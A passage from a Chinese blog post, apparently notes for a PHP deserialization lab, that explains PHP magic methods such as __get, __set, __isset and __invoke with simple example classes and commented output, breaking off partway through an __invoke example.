<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1.0"/><meta name="author" content="LwhalE"/><meta name="copyright" content="LwhalE"/><meta name="theme-color" content="#FFB347"/><meta name="format-detection" content="telephone=no"/><meta name="keywords" content="web"/><meta name="mobile-web-app-capable" content="yes"/><meta name="apple-mobile-web-app-capable" content="yes"/><meta name="apple-touch-fullscreen" content="yes"/><meta name="application-name" content="php反序列化靶场 | LwhalE's blog"/><meta name="apple-mobile-web-app-title" content="php反序列化靶场 | LwhalE's blog"/><meta name="apple-mobile-web-app-status-bar-style" content="#FFB347"/><link rel="canonical" href="https://LwhalEee.github.io/2026/02/06/php反序列化靶场/"/><meta name="description" content="PHP魔术方法 __construct() → 创建对象时自动执行；对象被实例化时触发 __destruct() → 对象销毁时自动执行 __get($name) → 读取不存在的属性时调用；用于从不可访问的属性读取数据或者不存在这个键都会调用此方法 __set($name, $value) → 设置不存在的属性时调用；用于将数据写入不可访问的属性 __isset($name) → 对不存在...">
<meta property="og:type" content="article">
<meta property="og:title" content="php反序列化靶场 | LwhalE&#39;s blog">
<meta property="og:url" content="https://lwhaleee.github.io/2026/02/06/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%9D%B6%E5%9C%BA/index.html">
<meta property="og:site_name" content="LwhalE&#39;s blog">
<meta property="og:description" content="PHP魔术方法 __construct() → 创建对象时自动执行；对象被实例化时触发 __destruct() → 对象销毁时自动执行 __get($name) → 读取不存在的属性时调用；用于从不可访问的属性读取数据或者不存在这个键都会调用此方法 __set($name, $value) → 设置不存在的属性时调用；用于将数据写入不可访问的属性 __isset($name) → 对不存在...">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://lwhaleee.github.io/images/Hexo-Theme-MEOW.png">
<meta property="article:published_time" content="2026-02-06T09:45:41.000Z">
<meta property="article:modified_time" content="2026-02-10T06:10:42.122Z">
<meta property="article:author" content="LwhalE">
<meta property="article:tag" content="web">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://lwhaleee.github.io/images/Hexo-Theme-MEOW.png"><meta name="robots" content="index,follow"/><meta name="googlebot" content="index,follow"/><meta name="revisit-after" content="1 days"/><title>php反序列化靶场 | LwhalE's blog</title><link rel="shortcut icon" href="/images/Hexo-Theme-MEOW.ico"><link rel="preconnect" href="/assets"/><link rel="preconnect" href="assets"/>
<link rel="stylesheet" href="/css/style.css">
<link rel="prefetch" href="/"/><link rel="prefetch" href="/archives"/><link rel="prefetch" href="/tags"/><meta name="generator" content="Hexo 8.1.1"></head><body bg-style="none"><header><div id="navbar"><div id="nav-info"><a id="site-icon" href="/" title="主页"><img src="/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a id="site-name" href="/" title="主页"><div>LwhalE's blog</div><img src="/assets/images/svg/uc/uc-home.svg" class="icon noview" alt="Icon"></a></div><div id="nav-menu"><div class="menu-item"><a href="/"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>首页</span></a></div><div class="menu-item"><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></div><div class="menu-item"><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>分类</span></a></div><div class="menu-item"><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></div><div class="menu-item"><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></div></div><div id="nav-function"><div id="menu-btn"><a href="javascript:void(0);" title="打开菜单"><img src="/assets/images/svg/uc/uc-menu.svg" class="icon noview" alt="Icon"></a></div></div></div></header><div id="menu-aside"><div id="menu-aside-container"><div id="menu-aside-info"><a href="/" title="主页"><img src="/images/Hexo-Theme-MEOW.png" alt="Logo"/></a><a href="/" title="主页">LwhalE's blog</a></div><div class="menu-aside-item"><a href="/"><img src="/assets/images/svg/uc/uc-article.svg" class="icon noview" alt="Icon"><span>首页</span></a></div><div class="menu-aside-item"><a href="/archives"><img src="/assets/images/svg/uc/uc-archive.svg" class="icon noview" alt="Icon"><span>归档</span></a></div><div class="menu-aside-item"><a href="/categories"><img src="/assets/images/svg/uc/uc-category.svg" class="icon noview" alt="Icon"><span>分类</span></a></div><div class="menu-aside-item"><a href="/tags"><img src="/assets/images/svg/uc/uc-tag.svg" class="icon noview" alt="Icon"><span>标签</span></a></div><div class="menu-aside-item"><a href="/about"><img src="/assets/images/svg/uc/uc-about.svg" class="icon noview" alt="Icon"><span>关于</span></a></div><hr/></div></div><main><div class="banner"><div class="banner-info"><div class="banner-avatar"><img src="/images/Hexo-Theme-MEOW.png" alt="Avatar"/></div><div class="banner-title">「 Lwhale's Blog 」</div></div></div><div class="post-container"><div class="post-main"><div class="post-content"><h1 class="post-title">php反序列化靶场</h1><div class="post-author"><span>作者: LwhalE</span></div><div class="post-meta"><div class="post-info"><div class="post-date"><div class="post-pubdate"><img src="/assets/images/svg/ta/ta-pubdate.svg" class="icon noview" alt="Icon"><span>发表于2026-02-06</span></div><div class="post-update"><img src="/assets/images/svg/ta/ta-update.svg" class="icon noview" alt="Icon"><span>更新于2026-02-10</span></div></div><div class="post-read"></div></div><div class="post-attribute"><div class="post-categories"><img src="/assets/images/svg/ta/ta-category.svg" class="icon noview" alt="Icon"><span><a class="post-categories-link" href="/categories/learning/">learning</a></span></div><div class="post-tags"><img src="/assets/images/svg/ta/ta-tag.svg" class="icon noview" alt="Icon"><span><a class="post-tags-link" href="/tags/web/" rel="tag">web</a></span></div></div></div><div class="post markdown" indent="false"><h2 id="PHP魔术方法"><a href="#PHP魔术方法" class="headerlink" title="PHP魔术方法"></a>PHP魔术方法</h2><ul>
<li><code>__construct()</code> → 创建对象时自动执行；对象被实例化时触发</li>
<li><code>__destruct()</code> → 对象销毁时自动执行</li>
<li><code>__get($name)</code> → 读取不存在的属性时调用；用于从不可访问的属性读取数据或者不存在这个键都会调用此方法</li>
<li><code>__set($name, $value)</code> → 设置不存在的属性时调用；用于将数据写入不可访问的属性</li>
<li><code>__isset($name)</code> → 对不存在的属性用 <code>isset()</code> 或 <code>empty()</code> 时调用</li>
<li><code>__unset($name)</code> → 对不存在的属性用 <code>unset()</code> 时调用</li>
<li><code>__call($method, $args)</code> → 调用不存在的方法时触发；在对象上下文中调用不可访问的方法时触发</li>
<li><code>__callStatic($method, $args)</code> → 调用不存在的静态方法时触发；在静态上下文中调用不可访问的方法时触发</li>
<li><code>__toString()</code> → 对象转字符串时调用；把类当作字符串使用时触发</li>
<li><code>__invoke()</code> → 把对象当函数用时调用；当尝试将对象调用为函数时触发</li>
<li><code>__clone()</code> → 克隆对象时执行</li>
<li><code>__wakeup() </code> → 执行unserialize()时，先会调用这个函数</li>
<li><code>__sleep() </code> → 执行serialize()时，先会调用这个函数</li>
</ul>
<p>整理了部分更加详细的魔术方法使用，后续会再补充一些</p>
<ul>
<li><p>__construct()&#96; → 创建对象时自动执行</p>
<p>PHP允许开发者在一个类中定义一个方法作为构造函数。具有构造函数的类会在每次创建新对象时先调用此方法，所以非常适合在使用对象之前做一些初始化工作。</p>
</li>
<li><p><code>__destruct()</code> → 对象销毁时自动执行</p>
<p>析构函数（Destructor）是面向对象编程中一种特殊的成员函数，它在对象生命周期结束时被自动调用，主要工作是<strong>清理和释放对象生前占用的资源</strong>，如动态分配的内存、打开的文件句柄、网络连接等，以防止资源泄漏，确保程序稳定运行。</p>
<p>也就是说，destruct函数可以在脚本结束前执行其他操作，脚本结束会自动清理内容缓存，destruct可以在脚本清除数据之前做到对数据的保存（转移到另一个文件里），也可以在清理前执行关闭文件之类的，使数据被正确释放</p>
<p>直接执行，然后没有对其他文件连接的断开或者是储存操作，最后清空缓存的时候还是会把做的改变清理掉，完全初始化</p>
<p>在清理前执行断开连接或者是保存之后关闭文件，清理数据就不会再清理文件内的东西了</p>
</li>
<li><p><code>__get($name)</code> → 读取不存在的属性时调用</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fruit</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lemon</span> = <span class="string">&#x27;goodLemon&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cherry</span> = <span class="string">&#x27;goodCherry&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$orange</span> = <span class="string">&#x27;goodOrange&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;[__get] <span class="subst">$name</span>&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fruit</span> = <span class="keyword">new</span> <span class="title class_">Fruit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. public</span></span><br><span class="line"><span class="comment">//    → string(5) &quot;goodLemon&quot; </span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$fruit</span>-&gt;lemon); </span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. inaccessible(pivate)</span></span><br><span class="line"><span class="comment">//    → string(14) &quot;[__get] cherry&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$fruit</span>-&gt;cherry);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. inaccessible(protected) </span></span><br><span class="line"><span class="comment">//    → string(14) &quot;[__get] orange&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$fruit</span>-&gt;orange);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. non-existing</span></span><br><span class="line"><span class="comment">//    → string(13) &quot;[__get] apple&quot;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$fruit</span>-&gt;apple);</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>lemon是public的属性，所以可以正常读取。  </p>
<p>cherry是private，外界基本上是没办法读取的，因此触发了<code>__get</code>魔术方法。  </p>
<p>orange是protected，外界基本上是没办法读取的，因此触发了<code>__get</code>魔术方法。  </p>
<p>第四个示例的apple，基本上根本没有声明过，所以是不存在的，也触发了<code>__get</code>魔术方法。</p>
</li>
<li><p><code>__set($name, $value)</code> → 设置不存在的属性时调用</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Fruit</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lemon</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$cherry</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$orange</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;[__set] <span class="subst">$name</span>, <span class="subst">$value</span>&quot;</span>.PHP_EOL;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$fruit</span> = <span class="keyword">new</span> <span class="title class_">Fruit</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// 1. public</span></span><br><span class="line"><span class="comment">//    → 正常</span></span><br><span class="line"><span class="variable">$fruit</span>-&gt;lemon = <span class="string">&#x27;goodLemon&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 2. pivate</span></span><br><span class="line"><span class="comment">//    → [__set] cherry, goodCherry</span></span><br><span class="line"><span class="variable">$fruit</span>-&gt;cherry = <span class="string">&#x27;goodCherry&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 3. protected</span></span><br><span class="line"><span class="comment">//    → [__set] orange, goodOrange</span></span><br><span class="line"><span class="variable">$fruit</span>-&gt;orange = <span class="string">&#x27;goodOrange&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 4. non-existing</span></span><br><span class="line"><span class="comment">//    → [__set] apple, goodApple</span></span><br><span class="line"><span class="variable">$fruit</span>-&gt;apple = <span class="string">&#x27;goodApple&#x27;</span>;</span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>

<p>如示例所示，</p>
<ol>
<li><code>lemno</code> 是 public 的属性，所以可以正常写入。</li>
<li><code>cherry</code> 是 private，外界基本上是没办法写入的，因此触发了 <code>__set</code> 魔术方法。</li>
<li><code>orange</code> 是 protected，外界基本上是没办法写入的，因此触发了 <code>__set</code> 魔术方法。</li>
<li>第四个示例的 <code>apple</code>，基本上根本没有声明过，所以是不存在的，也触发了 <code>__set</code> 魔术方法。</li>
</ol>
</li>
<li><p><code>__isset($name)</code> → 对不存在的属性用 <code>isset()</code> 或 <code>empty()</code> 时调用</p>
<p>属性重载（这个也在重载目录下）</p>
</li>
<li><p><code>__unset($name)</code> → 对不存在的属性用 <code>unset()</code> 时调用</p>
</li>
</ul>
<p>在给不可访问（protected 或 private）或不存在的属性赋值时，<code>__set()</code> 会被调用。</p>
<p>读取不可访问（protected 或 private）或不存在的属性的值时，<code>__get() </code>会被调用。</p>
<p>当对不可访问（protected 或 private）或不存在的属性调用<code>isset()</code>或<code>empty()</code>时，<code>__isset() </code>会被调用。</p>
<p>当对不可访问（protected 或 private）或不存在的属性调用 <code>unset()</code> 时，<code>__unset() </code>会被调用。</p>
<p>重载方面的不清楚可以重新研究这部分程序</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">PropertyTest</span> </span>&#123;</span><br><span class="line">     <span class="comment">/**  被重载的数据保存在此  */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$data</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">     <span class="comment">/**  重载不能被用在已经定义的属性  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$declared</span> = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">     <span class="comment">/**  只有从类外部访问这个属性时，重载才会发生（不可访问类型） */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$hidden</span> = <span class="number">2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__set</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$value</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Setting &#x27;<span class="subst">$name</span>&#x27; to &#x27;<span class="subst">$value</span>&#x27;\n&quot;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>] = <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Getting &#x27;<span class="subst">$name</span>&#x27;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">array_key_exists</span>(<span class="variable">$name</span>, <span class="variable">$this</span>-&gt;data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$trace</span> = <span class="title function_ invoke__">debug_backtrace</span>();</span><br><span class="line">        <span class="title function_ invoke__">trigger_error</span>(</span><br><span class="line">            <span class="string">&#x27;Undefined property via __get(): &#x27;</span> . <span class="variable">$name</span> .</span><br><span class="line">            <span class="string">&#x27; in &#x27;</span> . <span class="variable">$trace</span>[<span class="number">0</span>][<span class="string">&#x27;file&#x27;</span>] .</span><br><span class="line">            <span class="string">&#x27; on line &#x27;</span> . <span class="variable">$trace</span>[<span class="number">0</span>][<span class="string">&#x27;line&#x27;</span>],</span><br><span class="line">            E_USER_NOTICE);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__isset</span>(<span class="params"><span class="variable">$name</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Is &#x27;<span class="subst">$name</span>&#x27; set?\n&quot;</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__unset</span>(<span class="params"><span class="variable">$name</span></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Unsetting &#x27;<span class="subst">$name</span>&#x27;\n&quot;</span>;</span><br><span class="line">        <span class="keyword">unset</span>(<span class="variable language_">$this</span>-&gt;data[<span class="variable">$name</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**  非魔术方法  */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getHidden</span>(<span class="params"></span>) </span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;hidden;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> <span class="title class_">PropertyTest</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span>-&gt;a = <span class="number">1</span>; <span class="comment">// 触发 __set()因为属性 a 在类中没有定义，PHP会调用 __set() 方法来动态设置属性，输出: Setting &#x27;a&#x27; to &#x27;1</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;a . <span class="string">&quot;\n\n&quot;</span>; <span class="comment">// 触发 __get()，尝试访问未定义的属性 a，__get() 从 $data 数组中查找并返回值，输出: Getting &#x27;a&#x27; 然后输出 1</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">isset</span>(<span class="variable">$obj</span>-&gt;a));<span class="comment">// 触发 __isset()，检查未定义属性 a 是否设置，__isset() 检查 $data 数组中是否存在该键，输出: Is &#x27;a&#x27; set?</span></span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$obj</span>-&gt;a); <span class="comment">// 触发 __unset()，尝试销毁未定义属性 a，__unset() 从 $data 数组中移除该键，输出:Unsetting &#x27;a&#x27;</span></span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="keyword">isset</span>(<span class="variable">$obj</span>-&gt;a));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;declared . <span class="string">&quot;\n\n&quot;</span>;<span class="comment">//访问已定义的公共属性，不触发__get()$declared 是已定义的公共属性（public $declared = 1），PHP直接访问该属性，不经过魔术方法，输出: 1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Let&#x27;s experiment with the private property named &#x27;hidden&#x27;:\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Privates are visible inside the class, so __get() not used...\n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;<span class="title function_ invoke__">getHidden</span>() . <span class="string">&quot;\n&quot;</span>;<span class="comment">//通过方法访问私有属性，不触发 __get()，getHidden() 是普通方法，在类内部访问私有属性 $hidden，私有属性在类内部可见，直接返回 $this-&gt;hidden，输出: 2</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Privates not visible outside of class, so __get() is used...\n&quot;</span>;  <span class="comment">// 触发 __get()，从类外部直接访问私有属性 $hidden，私有属性在类外部不可访问，因此触发 __get()，$data 数组中没有 &#x27;hidden&#x27; 键，触发错误，输出: Getting &#x27;hidden&#x27; 然后触发 notice 错误</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$obj</span>-&gt;hidden . <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><div class="code-fold" title="Fold/Open"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M6 9l6 6l6 -6" /></svg></div><div class="code-copy" title="Copy"><svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"  stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M7 7m0 2.667a2.667 2.667 0 0 1 2.667 -2.667h8.666a2.667 2.667 0 0 1 2.667 2.667v8.666a2.667 2.667 0 0 1 -2.667 2.667h-8.666a2.667 2.667 0 0 1 -2.667 -2.667z" /><path d="M4.012 16.737a2.005 2.005 0 0 1 -1.012 -1.737v-10c0 -1.1 .9 -2 2 -2h10c.75 0 1.158 .385 1.5 1" /></svg></div></div></div>



<ul>
<li><p><code>__call($method, $args)</code> → 调用不存在的方法时触发</p>
<p>​    在对象中调用一个不可访问方法时，<code>__call() </code>会被调用。</p>
<p><em><code>__callStatic($method, $args)</code> → 调用不存在的静态方法时触发</em></p>
<p>​    在静态上下文中调用一个不可访问方法时，<code>__callStatic()</code> 会被调用。</p>
<ul>
<li>$name 参数是要调用的方法名称。$arguments 参数是一个枚举数组，包含着要传递给方法 $name 的参数。</li>
</ul>
<p>方法重载</p>
<p>重载</p>
<p>PHP所提供的重载（overloading）是指动态地创建类属性和方法， 当调用当前环境下未定义或不可见的类属性或方法时，重载方法会被调用。我们是通过魔术方法（magic methods）来实现的。</p>
<p>所有的重载方法都必须被声明为 <code>public</code>。</p>
<p>不可访问属性（inaccessible properties）和不可访问方法（inaccessible methods）来称呼这些未定义或不可见的类属性或方法。</p>
</li>
<li><p><code>__toString()</code> → 对象转字符串时调用</p>
</li>
</ul>
<p>方法用于一个类被当成字符串时应怎样回应。例如 echo $obj; 应该显示些什么。</p>
<p>有使用的注意事项，有空自己搜出来看吧，料你这会都用不上</p>
<ul>
<li><p><code>__invoke()</code> → 把对象当函数用时调用</p>
<p>当尝试以调用函数的方式调用一个对象时，__invoke() 方法会被自动调用。</p>
<div class="code-container" code-lang="Php"><div class="codebox"><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Sort</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="keyword">string</span> <span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;key = <span class="variable">$key</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span 